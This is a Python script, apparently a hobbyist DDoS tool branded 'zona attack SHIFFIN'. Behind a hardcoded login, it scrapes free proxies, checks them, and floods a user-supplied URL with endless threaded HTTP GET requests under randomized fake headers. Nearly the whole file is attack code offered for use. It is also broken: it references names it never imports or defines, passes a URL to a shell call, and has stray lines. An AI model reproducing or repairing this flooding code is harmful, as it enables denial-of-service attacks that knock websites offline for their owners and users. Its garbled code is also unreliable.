#!/usr/bin/python3
# -*- coding: utf-8  -*-
import requests as r
import os
import threading
import random
import click
import fake_headers
from threading import Thread
import time

# Clearing the SCREEN
class colors:
    BLACK = '\033[30m'
    RED = '\033[31m'
    GREEN = '\033[32m'
    YELLOW = '\033[33m'
    BLUE = '\033[34m'
    MAGENTA = '\033[35m'
    CYAN = '\033[36m'
    LIGHT_GRAY = '\033[37m'
    DARK_GRAY = '\033[90m'
    LIGHT_RED = '\033[91m'
    LIGHT_GREEN = '\033[92m'
    LIGHT_YELLOW = '\033[93m'
    LIGHT_BLUE = '\033[94m'
    LIGHT_MAGENTA = '\033[95m'
    LIGHT_CYAN = '\033[96m'
    WHITE = '\033[97m'
    RESET = '\033[0m'
    BOLD = '\033[1m'
    DIM = '\033[2m'
    ITALIC = '\033[3m'
    UNDERLINE = '\033[4m'
    BLINK = '\033[5m'
    REVERSE = '\033[7m'
    HIDDEN = '\033[8m'
    STRIKETHROUGH = '\033[9m'
    DOUBLE_UNDERLINE = '\033[21m'
    NORMAL_COLOR = '\033[22m'
    NORMAL_INTENSITY = '\033[22m'
    RESET_UNDERLINE = '\033[24m'
    RESET_BLINK = '\033[25m'
    RESET_REVERSE = '\033[27m'
    RESET_HIDDEN = '\033[28m'
    RESET_STRIKETHROUGH = '\033[29m'
    ORANGE = '\033[38;5;214m'  # Light Orange
    PURPLE = '\033[38;5;141m'  # Light Purple
    TEAL = '\033[38;5;37m'     # Teal
    PINK = '\033[38;5;206m'    # Light Pink
    LIME = '\033[38;5;154m'    # Lime Green
    CYAN_BLUE = '\033[38;5;39m'  # Cyan Blue
    DARK_GREEN = '\033[38;5;22m'  # Dark Green
    SKY_BLUE = '\033[38;5;111m'  # Sky Blue
    DARK_ORANGE = '\033[38;5;166m'  # Dark Orange
    INDIGO = '\033[38;5;57m'   # Indigo
    GRAY = '\033[38;5;242m'   
    MAROON = '\033[38;5;52m'   
    OCEAN_BLUE = '\033[38;5;21m'  
    GOLD = '\033[38;5;220m' 

os.system("clear")
os.system(f"\033[33mhttps://github.com/kunfayz6-lab\033[0m")
print(f"\033[38;5;242mWELOCOME TO ZONA PERANG SHIFFIN\033[0m")
time.sleep(5)
print("Loading.......")

attemps = 0
print("""
f"{Fore.GREEN}═════════════════════════════════════════════════════",
f"{Fore.GREEN} ╔═════╗",
f"{Fore.GREEN} ██████║",
f"{Fore.GREEN}        █║",
f"{Fore.GREEN}      █║",
f"{Fore.GREEN}    █║",
f"{Fore.GREEN}  █╚════╗",
f"{Fore.GREEN} ██████╝",
""")

while attemps < 100:
    username = input(f"\033[33mEnter your username: ")
    password = input(f"\033[32mEnter your password: ")

    if username == 'kun99' and password == 'kun99':
        print("\033[32m⟩⟩ Hai...! Welcome to zona attack SHIFFIN \033[0m")
        break
    else:
        print('Incorrect credentials. Check if you have Caps lock on and try again.')
        attemps += 1
        continue

def check_prox(array, url):
	ip = r.post("http://ip.beget.ru/").text
	for prox in array:
		thread_list = []
		t = threading.Thread (target=check, args=(ip, prox, url))
		thread_list.append(t)
		t.start()

while threading.active_count()>150 :
    time.sleep(5)
Thread:{threading.get_ident()}
def __init__(self):
        print("init")
	
def check(ip, prox, url):
	try:
		ipx = r.get("http://ip.beget.ru/", proxies={'http': "http://{}".format(prox), 'https':"http://{}".format(prox)}).text
	except:
		ipx = ip
	if ip != ipx:
		thread_list = []
		t = threading.Thread (target=ddos, args=(prox, url))
		thread_list.append(t)
		t.start()

def ddos(prox, url):
	proxies={"http":"http://{}".format(prox), "https":"http://{}".format(prox)}
	colors = ("\033[92m,\033[93m,\033[91m,\033[38;5;206m,\033[38;5;214m,\033[38;5;21m,\033[33m")
	color = random.choice(colors)
	while True:
		headers = Headers(headers=True).generate()
		thread_list = []
		t = threading.Thread (target=start_ddos, args=(prox, url, headers, proxies, color))
		thread_list.append(t)
		t.start()

def start_ddos(prox, url, headers, proxies, color):
	try:
		s = r.Session()
		req = s.get(url, headers=headers, proxies=proxies)
		if req.status_code == 200:
			print(color+"{}".format(prox))
	except:
		pass

@click.command()
@click.option('--proxy', '-p', help="\033[32mFile with a proxy\033[0m")
@click.option('--url', '-u', help="URL")
def main(proxy, url):
	clear()
	
	if url == None:
		url = input("URL: ")
	if url[:4] != "http":
		print("\033[33mEnter the full URL (example: http*://****.**/)\033[0m")
		exit()
	if proxy == None:
		while True:
			req = r.get("https://api.proxyscrape.com/?request=displayproxies")
			array = req.text.split()
			print("\033[34mFound {} new proxies".format(len(array)))
			check_prox(array, url)
	else:
		try:
			fx = open(proxy)
			array = fx.read().split()
			print("Found {} proxies in {}.\nChecking proxies...".format(len(array), proxy))
			check_prox(array, url)
		except FileNotFoundError:
			print("\033[32mFile {} not found.\033[0m")
			exit()

main()
